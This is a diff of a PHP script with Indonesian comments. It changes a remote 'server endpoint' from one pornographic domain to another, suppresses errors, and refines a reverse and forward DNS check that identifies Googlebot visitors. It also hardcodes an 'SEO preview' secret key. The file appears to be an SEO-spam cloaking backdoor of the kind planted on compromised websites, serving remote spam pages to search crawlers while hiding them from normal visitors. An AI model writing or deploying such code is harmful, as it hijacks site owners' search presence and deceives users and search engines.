@@ -7,33 +7,52 @@ error_reporting(0);
 @ignore_user_abort(1);
 
 // ** URL Server Endpoint (index-endpoint.php) **
-$tr = "https://dirtysecretsporn.com/";
+$tr = "https://avs.javpornsub.cloud/";
 
 // Kunci rahasia untuk pratinjau. HARUS SAMA dengan yang ada di dashboard.php
 define('SEO_PREVIEW_KEY', 'secretpreview12345');
 
-// --- KELAS VERIFIKASI BOT (DIGABUNGKAN) ---
+// --- KELAS VERIFIKASI BOT (VERSI PENYEMPURNAAN) ---
 class BotVerifier {
     private static $cache = [];
 
     public static function isVerifiedGooglebot() {
         $ip = $_SERVER['REMOTE_ADDR'];
-        if (isset(self::$cache[$ip])) { return self::$cache[$ip]; }
+        if (isset(self::$cache[$ip])) {
+            return self::$cache[$ip];
+        }
 
+        // 1. Dapatkan hostname dari IP (Reverse DNS)
         $hostname = @gethostbyaddr($ip);
 
-        if ($hostname === $ip || (strpos($hostname, '.googlebot.com') === false && strpos($hostname, '.google.com') === false)) {
+        // 2. Periksa apakah hostname valid dan berasal dari domain Google yang diizinkan
+        $is_valid_google_domain = false;
+        if ($hostname !== $ip && $hostname !== false) {
+            $allowed_domains = ['.google.com', '.googlebot.com', '.googleusercontent.com'];
+            foreach ($allowed_domains as $domain) {
+                // Pastikan hostname diakhiri dengan salah satu domain yang diizinkan
+                if (substr_compare($hostname, $domain, -strlen($domain)) === 0) {
+                    $is_valid_google_domain = true;
+                    break;
+                }
+            }
+        }
+
+        if (!$is_valid_google_domain) {
             self::$cache[$ip] = false;
             return false;
         }
 
+        // 3. Verifikasi balik: Dapatkan IP dari hostname (Forward DNS)
         $resolved_ip = @gethostbyname($hostname);
 
+        // 4. Pastikan IP hasil verifikasi sama dengan IP awal
         if ($resolved_ip === $ip) {
             self::$cache[$ip] = true;
             return true;
         }
 
+        // Jika gagal, cache sebagai false
         self::$cache[$ip] = false;
         return false;
     }
